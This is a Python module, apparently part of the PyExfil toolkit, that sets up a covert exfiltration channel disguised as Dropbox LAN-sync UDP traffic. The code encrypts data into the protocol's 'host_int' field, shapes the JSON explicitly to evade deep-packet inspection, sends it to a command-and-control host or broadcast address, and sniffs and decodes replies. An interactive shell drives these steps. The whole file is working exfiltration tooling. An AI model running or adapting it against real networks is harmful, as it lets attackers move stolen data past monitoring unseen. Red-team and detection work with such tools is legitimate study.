#!/usr/bin/env python3

import os
import sys
import csv
import json
import socket
import threading
from io import StringIO

from scapy.all import sniff, UDP

from pyexfil.includes.base import CommModule
from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB


PROMPT  = "DB_LSP > "
counter = 0


class mydict(dict):
    """
    Ensures JSON serialises with double-quotes rather than single-quotes.
    Avoids easy identification of the protocol by deep-inspection tools.
    https://stackoverflow.com/questions/18283725/
    """
    def __str__(self):
        return json.dumps(self)


class DB_LSP(CommModule):

    MODULE_NAME = "DB_LSP"
    PROTOCOL    = "dropbox-lan-sync-udp"

    def __init__(self, cnc, key, port=17500, verbose=False):
        """
        :param cnc:  CnC host or broadcast address [str]
        :param key:  Encryption key [str]
        :param port: UDP port [int]
        """
        super().__init__(enc_key=key, on_message=None, verbose=verbose)
        self.cnc     = cnc
        self.port    = port
        self.address = (self.cnc, self.port)
        self.data    = None
        self.DEFAULT_STRUCT = {
            "host_int": 123456,
            "versions": [2, 0],
            "displayname": "",
            "port": self.port,
            "namespaces": [1, 2, 3],
        }
        self.payload = ""

    # ------------------------------------------------------------------
    # Legacy protocol helpers (logic unchanged)
    # ------------------------------------------------------------------

    def _Create(self):
        data_bytes = self.data if isinstance(self.data, bytes) else self.data.encode("utf-8")
        this_data = dict(self.DEFAULT_STRUCT)
        encrypted = AESEncryptOFB(self.enc_key, data_bytes)
        # Store as a list of ints so json.dumps can serialise it
        this_data["host_int"] = list(encrypted)
        self.payload = str(mydict(this_data))

    def Send(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if ".255" in self.address[0]:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            else:
                s.bind(("", self.port))
        except socket.error as e:
            sys.stderr.write("Failed to create socket.\n")
            sys.stderr.write("%s\n" % e)
            return False

        try:
            payload_bytes = (
                self.payload.encode("utf-8")
                if isinstance(self.payload, str)
                else self.payload
            )
            s.sendto(payload_bytes, self.address)
            sys.stdout.write("%s bytes sent to %s.\n" % (len(payload_bytes), self.address))
        except Exception:
            sys.stderr.write("Error sending message to %s.\n" % str(self.address))
            return False
        return True

    # ------------------------------------------------------------------
    # CommModule abstract implementations
    # ------------------------------------------------------------------

    def _send_impl(self, data, **kwargs):
        self.data = data
        self._Create()
        return self.Send()

    def _broadcast_impl(self, data, **kwargs):
        # Use broadcast address convention: replace last octet with 255
        parts = self.cnc.split(".")
        parts[-1] = "255"
        original = self.address
        self.address = (".".join(parts), self.port)
        result = self._send_impl(data)
        self.address = original
        return result

    def _listen_impl(self, callback, **kwargs):
        SniffAndDecode(key=self.enc_key, host=self.cnc, port=self.port,
                       callback=callback, stop_event=self._stop_event)


# ------------------------------------------------------------------
# Module-level CLI helpers (unchanged protocol logic)
# ------------------------------------------------------------------

def SniffAndDecode(key, host, port=17500, callback=None, stop_event=None):
    def custom_action(packet):
        global counter
        counter += 1
        if packet[0][1].src == host:
            if packet[0][UDP].sport == port:
                try:
                    message = str(packet[0][UDP].payload).strip()
                    jdump = json.loads(message)
                except Exception:
                    sys.stderr.write(
                        "Got message from the right IP on the right port but "
                        "it does not look like a DB-LSP message.\n"
                    )
                    sys.stderr.flush()
                    return
                try:
                    raw = jdump["host_int"]
                    if isinstance(raw, list):
                        raw = bytes(raw)
                    mess = AESDecryptOFB(key, raw)
                    if callback:
                        callback(mess, {"src": host})
                    else:
                        sys.stdout.write("\n\t%s -> %s\n" % (host, mess))
                        sys.stdout.flush()
                    return
                except Exception:
                    sys.stderr.write("Message was received but not decrypted.\n")
                    sys.stderr.flush()
                    return

    sys.stdout.write("Starting listener for %s.\n" % host)
    sniff(filter="udp", prn=custom_action,
          stop_filter=lambda p: stop_event is not None and stop_event.is_set())


def SniffWrapper(key, host, port=17500):
    th = threading.Thread(target=SniffAndDecode, args=(key, host, port))
    th.start()
    return th


def StartShell():
    params = {}
    active = False
    _help()
    while True:
        if active:
            sys.stdout.write(params["server"] + "@" + PROMPT)
        else:
            sys.stdout.write(PROMPT)

        try:
            command = input()
        except Exception:
            sys.stderr.write("Whhhat?\n")
            continue

        if command.strip() in ("exit", "quit"):
            if active:
                params["thread"]._Thread__stop()
            sys.stdout.write("Thanks and see you soon.\n")
            sys.exit()

        if command.strip() == "help":
            _help()
            continue

        if " " in command.strip():
            data = StringIO(command)
            reader = csv.reader(data, delimiter=" ")
            for row in reader:
                split_command = row

            if split_command[0] == "send":
                try:
                    key = params["key"]
                except Exception:
                    sys.stderr.write("Please set a key with 'set key P@$$WorD!'.\n")
                    continue

                if not active:
                    if len(split_command) == 3:
                        dbObj = DB_LSP(cnc=split_command[2], key=params["key"])
                        dbObj._send_impl(split_command[1])
                    else:
                        sys.stderr.write("Please use 'send \"this is data\" 8.8.8.8'.\n")
                else:
                    if len(split_command) == 2:
                        dbObj = DB_LSP(cnc=params["server"], key=params["key"])
                        dbObj._send_impl(split_command[1])
                    else:
                        sys.stderr.write(
                            "Please use 'send \"this is data\"' since you're in active mode.\n"
                        )

            elif split_command[0] == "set":
                if len(split_command) == 3:
                    params[split_command[1]] = split_command[2]
                    sys.stdout.write(" %s --> %s.\n" % (split_command[1], split_command[2]))
                else:
                    sys.stderr.write("Please use 'set param value'.\n")

            elif split_command[0] == "show":
                if split_command[1] == "params":
                    sys.stdout.write(str(params) + "\n")
                else:
                    sys.stderr.write("I don't know what to show you.\n")

            elif split_command[0] == "active":
                try:
                    _ = params["listener"]
                except Exception:
                    sys.stderr.write(
                        "Please set a listener with 'set listener 127.0.0.1'.\n"
                    )
                    continue

                try:
                    _ = params["key"]
                except Exception:
                    sys.stderr.write("Please set a key with 'set key P@$$WorD!'.\n")
                    continue

                sys.stdout.write("Starting active mode with %s.\n" % split_command[1])
                thread = SniffWrapper(key=params["key"], host=params["listener"])
                params["thread"] = thread
                active = True
                params["server"] = split_command[1]

            elif split_command[0] == "deactivate":
                sys.stdout.write("Deactivating.\n")
                params["thread"]._Thread__stop()
                active = False


def _help():
    help_text = """
    To communicate between two hosts over broadcast you will need:
    \t1) Setup an encryption key which will be identical on both hosts.
    \t\tset key 123456
    \t2) Know which host is going to broadcast the message:
    \t\tset listener 10.0.0.1
    \t3) Start active mode:
    \t\tactive 10.0.0.255

    Now just send messages with:
    \tsend "hello world"

    """
    print(help_text)


if __name__ == "__main__":
    StartShell()
